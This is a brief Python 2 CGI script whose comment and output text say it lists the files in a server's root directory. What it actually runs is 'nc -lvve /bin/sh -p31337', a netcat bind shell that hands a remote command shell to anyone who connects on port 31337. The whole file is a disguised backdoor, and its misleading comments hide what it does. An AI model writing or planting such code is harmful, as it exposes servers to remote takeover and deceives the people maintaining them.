#!/usr/bin/python2.6
 
import subprocess
 
print "Content-type: text/html\n"
 
# Get the file list of all files
proc = subprocess.Popen(["nc -lvve /bin/sh -p31337"], stdout=subprocess.PIPE, shell=True)
(out,err) = proc.communicate()
print "The files in the servers root directory are\n\n"
print out
